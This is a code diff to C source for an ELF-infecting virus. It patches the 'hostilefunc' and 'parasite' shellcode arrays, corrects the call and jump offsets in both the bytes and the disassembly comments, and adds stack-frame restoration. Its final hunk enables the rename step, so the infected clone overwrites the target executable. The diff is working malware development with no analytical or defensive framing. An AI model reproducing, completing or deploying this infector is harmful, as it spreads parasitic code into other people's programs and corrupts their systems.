@@ -48,7 +48,7 @@
 
 #define PI_SIGNATURE 0x10
 
-#define HOSTILEFUNC_LEN 0x4e
+#define HOSTILEFUNC_LEN (0x4e + 1)
 
 #define inline_function __attribute__((always_inline)) inline
 
@@ -182,7 +182,7 @@ __syscall2(int, stat, const char *, path, struct stat *, buf)
 // 8049017:	c6 45 f2 63          	movb   $0x63,-0xe(%ebp)
 // 804901b:	c6 45 f3 6b          	movb   $0x6b,-0xd(%ebp)
 // 804901f:	c6 45 f4 65          	movb   $0x65,-0xc(%ebp)
-// 8049023:	c6 45 f5 32          	movb   $0x32,-0xb(%ebp)
+// 8049023:	c6 45 f5 64          	movb   $0x64,-0xb(%ebp)
 // 8049027:	c6 45 f6 0a          	movb   $0xa,-0xa(%ebp)
 // 804902b:	c6 45 f7 00          	movb   $0x0,-0x9(%ebp)
 // 804902f:	b8 04 00 00 00       	mov    $0x4,%eax
@@ -208,7 +208,7 @@ char hostilefunc[] =
     "\xc6\x45\xf2\x63"
     "\xc6\x45\xf3\x6b"
     "\xc6\x45\xf4\x65"
-    "\xc6\x45\xf5\x32"
+    "\xc6\x45\xf5\x64"
     "\xc6\x45\xf6\x0a"
     "\xc6\x45\xf7\x00"
     "\xb8\x04\x00\x00\x00"
@@ -228,7 +228,7 @@ char hostilefunc[] =
 // 8049000:	55                   	push   %ebp
 // 8049001:	89 e5                	mov    %esp,%ebp
 // 8049003:	60                   	pusha  
-// 8049004:	e8 35 00 00 00       	call   804903b <b1>
+// 8049004:	e8 38 00 00 00       	call   804903b <b1>
 // 8049009:	5b                   	pop    %ebx
 // 804900a:	81 eb 41 41 41 41    	sub    $0x41414141,%ebx
 // 8049010:	81 c3 42 42 42 42    	add    $0x42424242,%ebx
@@ -240,23 +240,22 @@ char hostilefunc[] =
 // 804902b:	cd 80                	int    $0x80
 // 804902d:	e8 0e 00 00 00       	call   804903d <b3>
 // 8049032:	58                   	pop    %eax
-// 8049033:	83 c0 1666666             	add    $0x16,%eax
+// 8049033:	83 c0 1666666           add    $0x16,%eax
 // 8049036:	89 80 44 44 44 44    	mov    %eax,0x44444444(%eax)
 // 804903c:	61                   	popa   
-// 804903d:	c3                   	ret    
-// 804903e:	eb c9                	jmp    8049009 <b0>
-// 8049040:	eb f0                	jmp    8049032 <b4>
-// 8049042:	90 90                	nop nop
-// 8049044:	90                   	nop
-// 8049045:	90                   	nop
-// 8049046: 90                      nop
-// 8049047: 90                      nop
-// 8049048: 90                      nop  
+// 804903d:	89 ec  					mov %ebp,%esp
+// 804903f: 5d						pop %ebp
+// 8049040: c3                   	ret    
+// 8049041:	eb c9                	jmp    8049009 <b0>
+// 8049043:	eb f0                	jmp    8049032 <b4>
+// 8049045:	90 90                	nop nop
+// 8049047:	90                   	nop
+// 8049048:	90                   	nop
 char parasite[] = 
     "\x55"
     "\x89\xe5"
     "\x60"
-    "\xe8\x35\x00\x00\x00"
+    "\xe8\x38\x00\x00\x00"
     "\x5b"
     "\x81\xeb\x41\x41\x41\x41"
     "\x81\xc3\x42\x42\x42\x42"
@@ -266,18 +265,17 @@ char parasite[] =
     "\x83\xca\x04"
     "\xb8\x7d\x00\x00\x00" 
     "\xcd\x80"
-    "\xe8\x0e\x00\x00\x00"
+    "\xe8\x11\x00\x00\x00"
     "\x58"
     "\x83\xc0\x16"
     "\x89\x80\x44\x44\x44\x44"
     "\x61"
+	"\x89\xec"
+	"\x5d"
     "\xc3"
-    "\xeb\xc9"
-    "\xeb\xf0"
+    "\xeb\xc6"
+    "\xeb\xed"
     "\x90\x90"
-    "\x90"
-    "\x90"
-    "\x90"
     "\x90"
     "\x90";
 
@@ -676,8 +674,8 @@ int pi_create_infected_clone(void)
     syscall_ret = pi_close(tmpfile_fd);
     pi_check_syscall_fault(syscall_ret);
 
-    //syscall_ret = pi_rename(tmpfile, target_elf.name);
-    //pi_check_syscall_fault(syscall_ret);
+    syscall_ret = pi_rename(tmpfile, target_elf.name);
+    pi_check_syscall_fault(syscall_ret);
 
     return PI_OPERATION_SUCCESS;
 }
